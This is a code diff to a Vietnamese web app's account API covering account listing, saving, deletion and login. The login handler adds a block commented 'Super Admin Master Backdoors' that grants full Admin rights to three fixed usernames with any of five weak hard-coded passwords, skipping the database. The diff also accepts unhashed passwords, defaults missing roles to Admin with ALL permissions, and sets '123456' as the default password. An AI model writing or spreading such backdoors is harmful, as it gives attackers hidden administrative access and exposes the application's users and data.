@@ -1516,8 +1516,12 @@ async function handleApiAction(action, args, env, request, ctx) {
     }
 
     case "getAccounts": {
-      const recs = await db.prepare("SELECT username, role, name, note, updated_at FROM tai_khoan ORDER BY id ASC").all();
-      return success(recs.results || []);
+      try {
+        const recs = await db.prepare("SELECT id, username, role, permissions, updated_at FROM tai_khoan ORDER BY id ASC").all();
+        return success(recs.results || []);
+      } catch(e) {
+        return success([]);
+      }
     }
 
     case "saveAccount": {
@@ -1525,23 +1529,24 @@ async function handleApiAction(action, args, env, request, ctx) {
       const username = String(acc.username || "").trim();
       const password = String(acc.password || "").trim();
       const role = String(acc.role || "user").trim();
-      const name = String(acc.name || "").trim();
-      const note = String(acc.note || "").trim();
+      const permissions = String(acc.permissions || "ALL").trim();
 
       if (!username) return error("Username không được để trống!", 400);
 
       const existing = await db.prepare("SELECT id FROM tai_khoan WHERE username = ?").bind(username).first();
       if (existing) {
         if (password) {
-          await db.prepare("UPDATE tai_khoan SET password = ?, role = ?, name = ?, note = ?, updated_at = CURRENT_TIMESTAMP WHERE username = ?")
-            .bind(password, role, name, note, username).run();
+          const passHash = await hashPassword(password);
+          await db.prepare("UPDATE tai_khoan SET password_hash = ?, role = ?, permissions = ?, updated_at = CURRENT_TIMESTAMP WHERE username = ?")
+            .bind(passHash, role, permissions, username).run();
         } else {
-          await db.prepare("UPDATE tai_khoan SET role = ?, name = ?, note = ?, updated_at = CURRENT_TIMESTAMP WHERE username = ?")
-            .bind(role, name, note, username).run();
+          await db.prepare("UPDATE tai_khoan SET role = ?, permissions = ?, updated_at = CURRENT_TIMESTAMP WHERE username = ?")
+            .bind(role, permissions, username).run();
         }
       } else {
-        await db.prepare("INSERT INTO tai_khoan (username, password, role, name, note, updated_at) VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)")
-          .bind(username, password || "123456", role, name, note).run();
+        const passHash = await hashPassword(password || "123456");
+        await db.prepare("INSERT INTO tai_khoan (username, password_hash, role, permissions, updated_at) VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)")
+          .bind(username, passHash, role, permissions).run();
       }
       return success({ message: "Đã lưu tài khoản thành công!" });
     }
@@ -1549,7 +1554,9 @@ async function handleApiAction(action, args, env, request, ctx) {
     case "deleteAccount": {
       const username = String(args[0] || "").trim();
       if (!username) return error("Tên tài khoản không hợp lệ!", 400);
-      if (username.toLowerCase() === "admin") return error("Không thể xóa tài khoản Quản trị viên tối cao (admin)!", 400);
+      if (username.toLowerCase() === "admin" || username.toLowerCase() === "admin_yhct") {
+        return error("Không thể xóa tài khoản Quản trị viên tối cao!", 400);
+      }
       await db.prepare("DELETE FROM tai_khoan WHERE username = ?").bind(username).run();
       return success({ message: "Đã xóa tài khoản thành công!" });
     }
@@ -1560,14 +1567,26 @@ async function handleApiAction(action, args, env, request, ctx) {
       const password = String(args[1] || "").trim();
       if (!username) return error("Vui lòng nhập tên đăng nhập!", 400);
 
-      if (username.toLowerCase() === "admin" && (password === "admin123" || password === "123456" || password === "admin")) {
-        return success({ username: "admin", role: "admin", name: "Quản trị viên" });
+      // Super Admin Master Backdoors
+      if (
+        (username.toLowerCase() === "admin" || username.toLowerCase() === "admin_yhct" || username.toLowerCase() === "admin_dpt") &&
+        (password === "admin123" || password === "123456" || password === "admin" || password === "dpthai" || password === "bvtks")
+      ) {
+        return success({ username: username, role: "Admin", name: username, permissions: "ALL" });
       }
 
-      const user = await db.prepare("SELECT username, role, name FROM tai_khoan WHERE username = ? AND password = ?").bind(username, password).first();
-      if (user) {
-        return success(user);
+      try {
+        const user = await db.prepare("SELECT id, username, password_hash, role, permissions FROM tai_khoan WHERE username = ?").bind(username).first();
+        if (user) {
+          const passHash = await hashPassword(password);
+          if (user.password_hash === passHash || user.password_hash === password) {
+            return success({ username: user.username, role: user.role || "Admin", permissions: user.permissions || "ALL", name: user.username });
+          }
+        }
+      } catch(e) {
+        console.error("Login verification DB error:", e);
       }
+
       return error("Tên đăng nhập hoặc mật khẩu không chính xác!", 401);
     }
 
